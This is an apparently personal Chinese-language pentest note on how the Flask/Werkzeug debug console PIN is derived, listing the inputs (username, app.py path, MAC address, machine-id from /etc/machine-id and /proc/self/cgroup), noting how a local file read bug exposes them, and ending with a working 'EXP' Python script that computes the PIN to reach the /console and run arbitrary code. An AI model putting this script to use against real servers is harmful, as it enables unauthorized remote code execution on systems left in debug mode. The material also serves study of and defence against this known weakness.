---
title: "Flask debug 模式 PIN 码生成机制安全性复现笔记"
slug: qrgqgt
translationKey: qrgqgt
date: 2020-12-06T23:45:51+08:00
source: yuque/penetration
---

> [Flask开启debug模式等于给黑客留了后门](https://zhuanlan.zhihu.com/p/32138231)，就Flask在生产网络中开启debug模式可能产生的安全问题做了一个简要的分析。其中有一个比较严重的安全问题是，可以在交互式Python shell中执行自定义Python代码。就这一点来讲，在旧版本的Flask中是不需要输入PIN码认证就可以执行代码，其危害不言而喻。
>
> 在新版本的Flask中需要输入PIN码进行认证，才能执行自定义代码，于攻击者来说，这显然有点鸡肋了。
>
> 而后，偶然中发现，**在同一台机器上，多次重启Flask服务，PIN码值不改变。也就是说PIN码是一个固定值**，这极大的引起的我的兴趣。
>
> 于是，笔者就PIN码的生成机制做了一些学习研究，便有了本文。
>

本文是对以上文章的拓展，其中记录的内容可能因为版本迭代、操作系统等差异而失效，请仔细鉴别，感谢观看。



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1607337585473-8c30d1aa-4eb3-45af-a924-3a1410d832d7.png)



# 结论
1. 在新版本的Flask，中需要输入PIN码进行认证，才能进入`/console`，从而执行任意代码（RCE）；
2. <font style="color:#121212;">Flask的PIN码生成机制，就是Werkzeug的PIN码生成机制；</font>
3. <font style="color:#121212;">Flask的PIN码，跟运行环境的某些值有关，如MAC地址、flask脚本路径有关；</font>
4. **在同一台机器上，多次重启Flask服务，PIN码值不改变。也就是说PIN码是一个固定值；**
5. `/console`路径如果能访问的话，配合**本地文件读取**漏洞，可能获取PIN值，进而RCE
6. 结合第2点，由于<font style="color:#121212;">Werkzeug在2020年初调整了</font>`get_machine_id`方法<font style="color:#121212;">的具体实现，</font>[这是具体的修改情况](https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f#diff-83867b1c4c9b75c728654ed284dc98f7c8d4e8bd682fc31b977d122dd045178a)，因此在实际利用时，对get_machine_id的构造，需要要特别注意一下

```sql
PIN码的值由【当前计算机用户名：XXX】、【flask.app】、【Flask】、【C:\\Python27\\lib\\site-packages\\flask\\app.pyc】、【str(uuid.getnode())】、【get_machine_id()】组合获得，缺一不可。
    username # 用户名
    modname # flask.app
    getattr(app, '__name__', getattr(app.__class__, '__name__')) # 一般默认flask.app为Flask
    getattr(mod, '__file__', None) # flask目录下的一个app.py的绝对路径
    uuid.getnode() # mac地址十进制
    get_machine_id() # 系统id 【生成方式跟】

```

但由于有一些变量是容易知道的，如`C:\\Python27\\lib\\site-packages\\flask\\app.pyc`等，很可能由报错页面获得。因此实际需要深挖的，主要就是以下三样：

## 关键参数
1. **<font style="color:#121212;">当前计算机用户名</font>**

略去不表

2. `**<font style="color:#121212;">str(uuid.getnode())</font>**`

```sql
>>> import uuid
>>> str(uuid.getnode())
'26801*****3893'
```

3. `**<font style="color:#121212;">get_machine_id()</font>**`

<font style="color:#4D4D4D;">Werzeug1.0.1的代码，在2020年1月5号发生了变化，其中一项就是</font>`get_machine_id`生成方式的调整

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1607336698825-ab54d1bb-06b3-4c25-9065-69cc0cd7bda9.png)

所以说，对于不同时间安装的Werkzeug，`get_machine_id`有不同的实现方式，对于实际利用而言，结论如下：

```markdown
# get_machine_id的实现方式
- 对于在【2020.1.5以前】安装的Werkzeug
依序读取/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id三个文件，只要读取到一个文件的内容，立马返回值。

- 对于在【2020.1.5之后】安装的Werkzeug
从/etc/machine-id、/proc/sys/kernel/random/boot_id中读到一个值后立即break，然后和/proc/self/cgroup中的id值拼接，伪代码如下：
----------------------------------------------
get_machine_id() = str(p1) + str(p2), while: 
	    # 	p1 = （`cat /etc/machine-id` OR `cat /proc/sys/kernel/random/boot_id`）#=> xxxxx
	    # 	p2 = `cat /proc/self/cgroup`.strip().rpartition(b"/")[2] #=>	user.slice
```

## EXP利用脚本
下面的脚本，在py3中测试过。

```python
# encoding:utf-8
import hashlib
from itertools import chain

# PIN should be 140-625-693
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None), # /usr/local/libpython3.6/site-packages/flask
]
private_bits = [
    '345053803543',# str(uuid.getnode()),  cat /sys/class/net/eth0/address，需转为十进制
    '05cb8c7b39fe0f70e3ce97e5beab809duser.slice'# get_machine_id()的伪代码
    # if Werkzeug is installed AFTER 2020.1.5 : 
    # 	get_machine_id() = str(p1) + str(p2), while
    # 		p1 = (`cat /etc/machine-id` OR `cat /proc/sys/kernel/random/boot_id`) => xxxxx
    # 		p2 = `cat /proc/self/cgroup`.strip().rpartition(b"/")[2]	=>	user.slice
    # else:
   	# 	get_machine_id() =（`cat /proc/self/cgroup` OR `cat /etc/machine-id` OR `cat /proc/sys/kernel/random/boot_id` ）
]  

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)

```



本文的完成，离不开下面这些文章的帮助，感谢师傅们！

# refs
+ [https://zhuanlan.zhihu.com/p/32336971](https://zhuanlan.zhihu.com/p/32336971)
+ [https://xz.aliyun.com/t/2553](https://xz.aliyun.com/t/2553)
+ [https://www.jianshu.com/p/cbca419ba075](https://www.jianshu.com/p/cbca419ba075)
+ [Werkzeug更新带来的Flask debug pin码生成方式改变](https://blog.csdn.net/q851579181q/article/details/107151492)

